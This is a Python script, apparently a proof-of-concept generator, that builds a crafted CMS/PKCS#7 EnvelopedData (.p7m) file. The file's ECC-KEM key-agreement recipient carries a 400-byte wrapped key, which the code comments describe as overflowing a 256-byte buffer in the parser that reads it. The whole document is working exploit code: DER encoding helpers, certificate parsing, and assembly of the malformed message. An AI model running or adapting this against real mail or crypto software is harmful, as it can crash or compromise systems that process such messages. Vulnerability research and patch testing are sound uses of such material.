import sys
from asn1crypto import core, x509, pem

# --- ASN.1 HELPER FUNCTIONS ---
def encode_len(length):
    if length < 0x80:
        return bytes([length])
    else:
        len_bytes = length.to_bytes((length.bit_length() + 7) // 8, 'big')
        return bytes([0x80 | len(len_bytes)]) + len_bytes

def der_tlv(tag, content):
    return bytes([tag]) + encode_len(len(content)) + content

def der_seq(chunks):
    return der_tlv(0x30, b''.join(chunks))

def der_set(chunks):
    return der_tlv(0x31, b''.join(chunks))

def der_octet_string(data):
    return der_tlv(0x04, data)

def der_bitstring(data):
    return der_tlv(0x03, b'\x00' + data)

# --- POC GENERATOR ---
def generate_poc(output_filename, cert_path):
    print(f"[*] Parsing certificate: {cert_path}")
    
    with open(cert_path, 'rb') as f:
        cert_data = f.read()
        if pem.detect(cert_data):
            _, _, cert_data = pem.unarmor(cert_data)
        cert = x509.Certificate.load(cert_data)
        
    issuer_raw = cert.issuer.dump() 
    serial_int = cert.serial_number

    # 1. Payload (400 bytes > 256 buffer)
    # This is the wrapped key ciphertext. 
    oversized_key = b'A' * 400
    
    # Dummy P-256 Public Key
    dummy_key = b'\x04' + b'\x41' * 64

    def get_oid(oid_str): return core.ObjectIdentifier(oid_str).dump()
    def get_int(val): return core.Integer(val).dump()
    
    oid_env_data   = get_oid('1.2.840.113549.1.7.3')
    oid_data       = get_oid('1.2.840.113549.1.7.1')
    oid_ecc_kem    = get_oid('1.3.132.1.11.1')         
    oid_aes_wrap   = get_oid('2.16.840.1.101.3.4.1.5') # AES-128-Wrap
    oid_aes128_cbc = get_oid('2.16.840.1.101.3.4.1.2') 
    oid_ec_pub     = get_oid('1.2.840.10045.2.1')      
    oid_secp256    = get_oid('1.2.840.10045.3.1.7')    

    # --- Originator Field ---
    algo_ec = der_seq([oid_ec_pub, oid_secp256])
    originator_inner = algo_ec + der_bitstring(dummy_key)
    originator_choice = der_tlv(0xA1, originator_inner)
    originator_field = der_tlv(0xA0, originator_choice)

    # --- Recipient Field ---
    rid = der_seq([issuer_raw, get_int(serial_int)])
    recip_enc_key = der_seq([
        rid,
        der_octet_string(oversized_key) 
    ])

    # --- KeyAgreeRecipientInfo ---
    
    # CRITICAL FIX: The KEM Algorithm must specify the Wrapping Scheme in its parameters.
    # AlgorithmIdentifier { 
    #   algorithm: 1.3.132.1.11.1 (ECC-KEM)
    #   parameters: AlgorithmIdentifier { 
    #       algorithm: 2.16.840.1.101.3.4.1.5 (AES-128-WRAP)
    #       parameters: NULL
    #   }
    # }
    wrap_scheme = der_seq([oid_aes_wrap, core.Null().dump()])
    kem_algo = der_seq([oid_ecc_kem, wrap_scheme])

    kari_content = b''.join([
        get_int(3),           # Version 3
        originator_field,     # Originator
        kem_algo,             # KeyEncAlgo (Corrected)
        der_seq([recip_enc_key]) 
    ])
    kari_tagged = der_tlv(0xA1, kari_content) 

    # --- EnvelopedData ---
    iv = der_octet_string(b'\x00' * 16)
    content_enc_algo = der_seq([oid_aes128_cbc, iv])

    env_data = der_seq([
        get_int(2), 
        der_set([kari_tagged]), 
        der_seq([ 
            oid_data,
            content_enc_algo, 
            der_tlv(0x80, b'secret') 
        ])
    ])

    content_info = der_seq([
        oid_env_data,
        der_tlv(0xA0, env_data)
    ])

    with open(output_filename, 'wb') as f:
        f.write(content_info)
    
    print(f"[+] Successfully created '{output_filename}'")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python poc_gen.py <output.p7m> <cert.pem>")
        sys.exit(1)
    generate_poc(sys.argv[1], sys.argv[2])
